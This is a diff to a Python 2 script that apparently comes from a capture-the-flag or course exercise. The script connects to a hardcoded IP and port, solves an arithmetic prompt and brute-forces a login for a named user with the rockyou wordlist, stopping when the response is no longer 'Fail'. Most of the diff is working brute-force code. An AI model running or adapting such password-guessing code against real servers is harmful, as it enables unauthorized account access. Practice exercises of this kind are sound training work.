@@ -27,10 +27,10 @@
 import socket
 import re
 import time
+import sys
 
 host = "157.230.179.99" # IP address here
 port = 1337 # Port here
-result="Fail"
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
@@ -39,21 +39,24 @@ def brute_force():
         How to use the socket s:
     '''
     f = open(wordlist, "r")
-    lines=f.readline
+    lines1=f.readlines()
+    #print lines1[0]
     count=0
+    result="Fail"
 
-    while count < len(lines) and result == "Fail": 
+    while count < len(lines1) and result == "Fail": 
    # Establish socket connection
     #add loop to go through checking if got correct password
-        i+=1
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
 
         #    Reading:
-
+        time.sleep(1)
         data = s.recv(1024)
+        while '=' not in data:
+            data+=s.recv(1024)
     # Receives 1024 bytes from IP/Port
-        time.sleep(5)
+        #time.sleep(5)
         print(data)             # Prints data
         entries = re.split("\n+", data)
         print entries
@@ -70,7 +73,7 @@ def brute_force():
         else:
             answer= int1*int2
         print answer
-    
+       
     #elems=re.findall('<num1>(\d+)\s<operand>(\/|\+|\-|\*)\s<num2>(\d+)\s=\s\?',data)
     #elems.
     #m = /(<int1>\d+)\s(<operand>\/|\+|\-|\*)\s(<int2>\d+)\s=\s\?/.match(entries[2])
@@ -82,10 +85,44 @@ def brute_force():
                  #answer=
          #   Sending:
     #when you fail password do s.close
-        s.send(str(answer)+'\n')   # Send a newline \n at the end of your command
-        response=s.recv(1024)
-        time.sleep(5)
+       # s.send(str(answer)+'\n')   # Send a newline \n at the end of your command
+        strtosend=str(answer)+'\n'
+        #print strtosend
+        s.send(strtosend)
+        #time.sleep(1)
+        response=s.recv(1024) #this one recieves the prompt for username and password at the same time ig this is the sleep that's causing that
         print response
+        while ':' not in response:
+            s.recv(1024)
+        s.send("ejnorman84\n")
+        print "ejnorman84\n"
+        #time.sleep(1)
+        response=s.recv(1024) #so apparently this one sends Fail and such
+        print "`````````"
+        print response
+        print "`````````"
+        while ':' not in response:
+            s.recv(1024)
+        s.send(lines1[count].strip()+'\n')
+        print lines1[count]
+        time.sleep(2)
+        response=s.recv(1024)
+        time.sleep(2)
+        print "-----"
+        print response
+        print "-----"
+        if response != "Fail\n":# && response != :
+            print "FOUND PASSWORD!"
+            sys.stdout=open('./filepath.txt','w')  
+            print "\n it's"
+            print lines1[count]
+            result="Success"
+        else:
+            print "wrong password\n"
+            result="Fail"
+        count+=1
+        s.close
+
 #when you get the password you print out i got the password and print it out
     '''
         General idea:
@@ -94,9 +131,8 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             v0idcache's server.
     '''
-
-    username = ""  # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    #username = "ejnorman84"  # Hint: use OSINT
+    #password = ""   # Hint: use wordlist
 
 
 
